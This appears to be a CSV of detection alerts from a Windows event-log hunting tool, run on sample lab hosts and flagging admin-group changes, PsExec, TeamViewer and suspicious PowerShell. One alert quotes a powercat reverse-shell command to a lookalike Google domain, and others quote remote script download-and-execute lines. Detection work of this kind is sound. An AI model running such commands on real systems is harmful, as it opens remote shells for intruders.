"2019-03-19 21:59:25.364 +01:00","User Added To Local Admin Grp","high","MSEDGEWIN10","Sec",4732,235,"SrcSID: S-1-5-21-321011808-3761883066-353627080-1001 ¦ TgtGrp: Administrators ¦ LID: 0x3e7","MemberName: - ¦ PrivilegeList: - ¦ SubjectDomainName: WORKGROUP ¦ SubjectUserName: MSEDGEWIN10$ ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: Builtin ¦ TargetSid: S-1-5-32-544","611e2e76-a28f-4255-812c-eb8836b2f5bb"
"2019-03-19 21:57:23.433 +01:00","Password Reset By Admin","med","MSEDGEWIN10","Sec",4724,203,"SubjectDomainName: WORKGROUP ¦ SubjectLogonId: 0x3e7 ¦ SubjectUserName: MSEDGEWIN10$ ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: MSEDGEWIN10 ¦ TargetSid: S-1-5-21-321011808-3761883066-353627080-1000 ¦ TargetUserName: IEUser","-","0b78aca4-35f0-4bec-acce-c5743ff26614"
"2019-03-19 21:57:23.463 +01:00","Password Reset By Admin","med","MSEDGEWIN10","Sec",4724,209,"SubjectDomainName: WORKGROUP ¦ SubjectLogonId: 0x3e7 ¦ SubjectUserName: MSEDGEWIN10$ ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: MSEDGEWIN10 ¦ TargetSid: S-1-5-21-321011808-3761883066-353627080-500 ¦ TargetUserName: Administrator","-","0b78aca4-35f0-4bec-acce-c5743ff26614"
"2019-03-19 21:59:25.310 +01:00","Password Reset By Admin","med","MSEDGEWIN10","Sec",4724,230,"SubjectDomainName: WORKGROUP ¦ SubjectLogonId: 0x3e7 ¦ SubjectUserName: MSEDGEWIN10$ ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: MSEDGEWIN10 ¦ TargetSid: S-1-5-21-321011808-3761883066-353627080-1001 ¦ TargetUserName: defaultuser0","-","0b78aca4-35f0-4bec-acce-c5743ff26614"
"2019-03-19 21:59:25.341 +01:00","Password Reset By Admin","med","MSEDGEWIN10","Sec",4724,232,"SubjectDomainName: WORKGROUP ¦ SubjectLogonId: 0x3e7 ¦ SubjectUserName: MSEDGEWIN10$ ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: MSEDGEWIN10 ¦ TargetSid: S-1-5-21-321011808-3761883066-353627080-1001 ¦ TargetUserName: defaultuser0","-","0b78aca4-35f0-4bec-acce-c5743ff26614"
"2019-03-19 14:23:55.995 +01:00","Password Reset By Admin","med","MSEDGEWIN10","Sec",4724,3590,"SubjectDomainName: WORKGROUP ¦ SubjectLogonId: 0x3e7 ¦ SubjectUserName: MSEDGEWIN10$ ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: MSEDGEWIN10 ¦ TargetSid: S-1-5-21-321011808-3761883066-353627080-1002 ¦ TargetUserName: sshd","-","0b78aca4-35f0-4bec-acce-c5743ff26614"
"2022-04-29 18:41:59.465 +02:00","User Password Changed","med","MSEDGEWIN10","Sec",4723,4293,"PrivilegeList: - ¦ SubjectDomainName: MSEDGEWIN10 ¦ SubjectLogonId: 0x9ad6f ¦ SubjectUserName: IEUser ¦ SubjectUserSid: S-1-5-21-321011808-3761883066-353627080-1000 ¦ TargetDomainName: MSEDGEWIN10 ¦ TargetSid: S-1-5-21-321011808-3761883066-353627080-1000 ¦ TargetUserName: IEUser","-","3b3046f3-a51c-4378-b059-c716aaa865b4"
"2022-05-08 21:06:51.718 +02:00","User Added To Local Admin Grp","high","PEGASUS01","Sec",4732,5710,"SrcSID: S-1-5-21-321011808-3761883066-353627080-501 ¦ TgtGrp: Administrators ¦ LID: 0x8c36b","MemberName: - ¦ PrivilegeList: - ¦ SubjectDomainName: PEGASUS01 ¦ SubjectUserName: IEUser ¦ SubjectUserSid: S-1-5-21-321011808-3761883066-353627080-1000 ¦ TargetDomainName: Builtin ¦ TargetSid: S-1-5-32-544","611e2e76-a28f-4255-812c-eb8836b2f5bb"
"2022-05-08 21:04:26.087 +02:00","Password Protected ZIP File Opened","med","PEGASUS01","Sec",5379,5680,"PID: 4016 ¦ SrcUser: IEUser ¦ Tgt: Microsoft_Windows_Shell_ZipFolder:filename=C:\Users\IEUser\AppData\Local\Temp\cosas.zip ¦ CredsReturned: 1 ¦ ReturnCode: 3221226021 ¦ LID: 0x8c39d ¦ SrcSID: S-1-5-21-321011808-3761883066-353627080-1000","ProcessCreationTime: 2022-04-29T10:47:38.613250Z ¦ ReadOperation: %%8099 ¦ SubjectDomainName: PEGASUS01","7e1daab0-3263-403e-ec26-de48e3bf22c3"
"2019-03-19 13:59:56.000 +01:00","Suspicious Service Path","high","MSEDGEWIN10","Sys",7045,211,"Svc: Printer Extensions and Notifications ¦ Path: %SystemRoot%\system32\svchost.exe -k print","AccountName: LocalSystem ¦ ServiceType: user mode service ¦ StartType: demand start","dbbfd9f3-9508-478b-887e-03ddb9236909"
"2022-04-29 18:31:43.489 +02:00","Suspicious Service Path","high","MSEDGEWIN10","Sys",7045,847,"Svc: VMware SVGA Helper Service ¦ Path: %SystemRoot%\system32\vm3dservice.exe","AccountName: LocalSystem ¦ ServiceType: user mode service ¦ StartType: auto start","dbbfd9f3-9508-478b-887e-03ddb9236909"
"2022-05-08 21:07:51.290 +02:00","Suspicious Service Path","high","PEGASUS01","Sys",7045,1797,"Svc: PsExec ¦ Path: %SystemRoot%\PSEXESVC.EXE","AccountName: LocalSystem ¦ ServiceType: user mode service ¦ StartType: demand start","dbbfd9f3-9508-478b-887e-03ddb9236909"
"2022-05-08 21:07:51.290 +02:00","PSExec Lateral Movement","high","PEGASUS01","Sys",7045,1797,"Svc: PsExec ¦ Path: %SystemRoot%\PSEXESVC.EXE ¦ Acct: LocalSystem ¦ StartType: demand start","ServiceType: user mode service","0694c340-3a46-40ac-acfc-c3444ae6572c"
"2022-04-29 19:12:31.906 +02:00","Remote Access Tool Services Have Been Installed - System","med","PEGASUS01","Sys",7045,1487,"Svc: TeamViewer ¦ Path: ""C:\Program Files\TeamViewer\TeamViewer_Service.exe"" ¦ Acct: LocalSystem ¦ StartType: auto start","ServiceType: user mode service","cd1c0081-d0c8-369f-2ed1-dcc058b08b9c"
"2022-05-08 21:06:32.976 +02:00","Netcat The Powershell Version","med","PEGASUS01","PwShClassic",400,161,"CommandLine: ¦ CommandName: ¦ CommandPath: ¦ CommandType: ¦ Data[1]: Available ¦ Data[2]: None ¦ Data[3]: NewEngineState=Available PreviousEngineState=None SequenceNumber=13 HostName=ConsoleHost HostVersion=5.1.17763.316 HostId=c0538c92-a2d6-4c93-8c1a-8c6207a34446 HostApplication=powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd EngineVersion=5.1.17763.316 RunspaceId=7d301a38-9a58-462b-b2a8-bf007a8c2687 PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine= ¦ EngineVersion: 5.1.17763.316 ¦ HostApplication: powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd ¦ HostId: c0538c92-a2d6-4c93-8c1a-8c6207a34446 ¦ HostName: ConsoleHost ¦ HostVersion: 5.1.17763.316 ¦ NewEngineState: Available ¦ PipelineId: ¦ PreviousEngineState: None ¦ RunspaceId: 7d301a38-9a58-462b-b2a8-bf007a8c2687 ¦ ScriptName: ¦ SequenceNumber: 13","-","cc575689-20fe-0dda-ed3b-93e52d0d8ef1"
"2019-03-19 14:21:25.149 +01:00","Suspicious PowerShell Download","med","MSEDGEWIN10","PwShClassic",400,109,"CommandLine: ¦ CommandName: ¦ CommandPath: ¦ CommandType: ¦ Data[1]: Available ¦ Data[2]: None ¦ Data[3]: NewEngineState=Available PreviousEngineState=None SequenceNumber=13 HostName=ConsoleHost HostVersion=5.1.17763.316 HostId=38d62719-3f61-40fc-8919-7504c91727fd HostApplication=powershell -NoProfile -ExecutionPolicy unrestricted -Command iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1')) EngineVersion=5.1.17763.316 RunspaceId=35abb463-f138-49ae-a2c4-4dde53bd0e48 PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine= ¦ EngineVersion: 5.1.17763.316 ¦ HostApplication: powershell -NoProfile -ExecutionPolicy unrestricted -Command iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1')) ¦ HostId: 38d62719-3f61-40fc-8919-7504c91727fd ¦ HostName: ConsoleHost ¦ HostVersion: 5.1.17763.316 ¦ NewEngineState: Available ¦ PipelineId: ¦ PreviousEngineState: None ¦ RunspaceId: 35abb463-f138-49ae-a2c4-4dde53bd0e48 ¦ ScriptName: ¦ SequenceNumber: 13","-","d938bbb0-a745-c4fc-ce0d-eb5a006e6757"
"2019-03-19 14:24:18.337 +01:00","Suspicious PowerShell Download","med","MSEDGEWIN10","PwShClassic",400,137,"CommandLine: ¦ CommandName: ¦ CommandPath: ¦ CommandType: ¦ Data[1]: Available ¦ Data[2]: None ¦ Data[3]: NewEngineState=Available PreviousEngineState=None SequenceNumber=13 HostName=ConsoleHost HostVersion=5.1.17763.316 HostId=44d71bb2-18a9-4ba9-8c3e-b677a7ccda6e HostApplication=powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://www.7-zip.org/a/7z920.msi', 'C:\Windows\Temp\7z920.msi') EngineVersion=5.1.17763.316 RunspaceId=a8b71087-9c06-4834-9197-2a927fc4ab7d PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine= ¦ EngineVersion: 5.1.17763.316 ¦ HostApplication: powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://www.7-zip.org/a/7z920.msi', 'C:\Windows\Temp\7z920.msi') ¦ HostId: 44d71bb2-18a9-4ba9-8c3e-b677a7ccda6e ¦ HostName: ConsoleHost ¦ HostVersion: 5.1.17763.316 ¦ NewEngineState: Available ¦ PipelineId: ¦ PreviousEngineState: None ¦ RunspaceId: a8b71087-9c06-4834-9197-2a927fc4ab7d ¦ ScriptName: ¦ SequenceNumber: 13","-","d938bbb0-a745-c4fc-ce0d-eb5a006e6757"
"2019-03-19 14:25:18.040 +01:00","Suspicious PowerShell Download","med","MSEDGEWIN10","PwShClassic",400,145,"CommandLine: ¦ CommandName: ¦ CommandPath: ¦ CommandType: ¦ Data[1]: Available ¦ Data[2]: None ¦ Data[3]: NewEngineState=Available PreviousEngineState=None SequenceNumber=13 HostName=ConsoleHost HostVersion=5.1.17763.316 HostId=d8e55f1d-ffde-4e98-9cef-c1663c707162 HostApplication=powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://downloads.sourceforge.net/project/ultradefrag/stable-release/6.1.0/ultradefrag-portable-6.1.0.bin.i386.zip', 'C:\Windows\Temp\ultradefrag.zip') EngineVersion=5.1.17763.316 RunspaceId=97d36964-5c3c-4d93-abba-7d4615ddd900 PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine= ¦ EngineVersion: 5.1.17763.316 ¦ HostApplication: powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://downloads.sourceforge.net/project/ultradefrag/stable-release/6.1.0/ultradefrag-portable-6.1.0.bin.i386.zip', 'C:\Windows\Temp\ultradefrag.zip') ¦ HostId: d8e55f1d-ffde-4e98-9cef-c1663c707162 ¦ HostName: ConsoleHost ¦ HostVersion: 5.1.17763.316 ¦ NewEngineState: Available ¦ PipelineId: ¦ PreviousEngineState: None ¦ RunspaceId: 97d36964-5c3c-4d93-abba-7d4615ddd900 ¦ ScriptName: ¦ SequenceNumber: 13","-","d938bbb0-a745-c4fc-ce0d-eb5a006e6757"
"2019-03-19 14:25:24.680 +01:00","Suspicious PowerShell Download","med","MSEDGEWIN10","PwShClassic",400,153,"CommandLine: ¦ CommandName: ¦ CommandPath: ¦ CommandType: ¦ Data[1]: Available ¦ Data[2]: None ¦ Data[3]: NewEngineState=Available PreviousEngineState=None SequenceNumber=13 HostName=ConsoleHost HostVersion=5.1.17763.316 HostId=40378a65-c7c0-4db2-9709-8f0fbfdc741c HostApplication=powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://download.sysinternals.com/files/SDelete.zip', 'C:\Windows\Temp\SDelete.zip') EngineVersion=5.1.17763.316 RunspaceId=f20e20e6-1792-45de-a004-3e24d2369f77 PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine= ¦ EngineVersion: 5.1.17763.316 ¦ HostApplication: powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://download.sysinternals.com/files/SDelete.zip', 'C:\Windows\Temp\SDelete.zip') ¦ HostId: 40378a65-c7c0-4db2-9709-8f0fbfdc741c ¦ HostName: ConsoleHost ¦ HostVersion: 5.1.17763.316 ¦ NewEngineState: Available ¦ PipelineId: ¦ PreviousEngineState: None ¦ RunspaceId: f20e20e6-1792-45de-a004-3e24d2369f77 ¦ ScriptName: ¦ SequenceNumber: 13","-","d938bbb0-a745-c4fc-ce0d-eb5a006e6757"
"2019-03-19 14:21:47.399 +01:00","Suspicious Non PowerShell WSMAN COM Provider","med","MSEDGEWIN10","PwShClassic",600,119,"CommandLine: ¦ CommandName: ¦ CommandPath: ¦ CommandType: ¦ Data[1]: WSMan ¦ Data[2]: Started ¦ Data[3]: ProviderName=WSMan NewProviderState=Started SequenceNumber=15 HostName=Chocolatey_PSHost HostVersion=5.1.17763.1 HostId=78c59c08-3bc2-411d-829e-73d62d2f0ec3 HostApplication=C:\ProgramData\chocolatey\choco.exe install -y puppet EngineVersion= RunspaceId= PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine= ¦ EngineVersion: ¦ HostApplication: C:\ProgramData\chocolatey\choco.exe install -y puppet ¦ HostId: 78c59c08-3bc2-411d-829e-73d62d2f0ec3 ¦ HostName: Chocolatey_PSHost ¦ HostVersion: 5.1.17763.1 ¦ NewProviderState: Started ¦ PipelineId: ¦ ProviderName: WSMan ¦ RunspaceId: ¦ ScriptName: ¦ SequenceNumber: 15","-","aedc0f64-b9e7-36d1-fd92-838fdf33eac3"
"2019-03-19 14:21:47.477 +01:00","Uncommon PowerShell Hosts","med","MSEDGEWIN10","PwShClassic",400,120,"CommandLine: ¦ CommandName: ¦ CommandPath: ¦ CommandType: ¦ Data[1]: Available ¦ Data[2]: None ¦ Data[3]: NewEngineState=Available PreviousEngineState=None SequenceNumber=17 HostName=Chocolatey_PSHost HostVersion=5.1.17763.1 HostId=78c59c08-3bc2-411d-829e-73d62d2f0ec3 HostApplication=C:\ProgramData\chocolatey\choco.exe install -y puppet EngineVersion=5.1.17763.316 RunspaceId=31f9e585-dba6-48e9-a278-8b8139698b7b PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine= ¦ EngineVersion: 5.1.17763.316 ¦ HostApplication: C:\ProgramData\chocolatey\choco.exe install -y puppet ¦ HostId: 78c59c08-3bc2-411d-829e-73d62d2f0ec3 ¦ HostName: Chocolatey_PSHost ¦ HostVersion: 5.1.17763.1 ¦ NewEngineState: Available ¦ PipelineId: ¦ PreviousEngineState: None ¦ RunspaceId: 31f9e585-dba6-48e9-a278-8b8139698b7b ¦ ScriptName: ¦ SequenceNumber: 17","-","315f165d-92fd-170d-d80b-0f16f9cf5384"
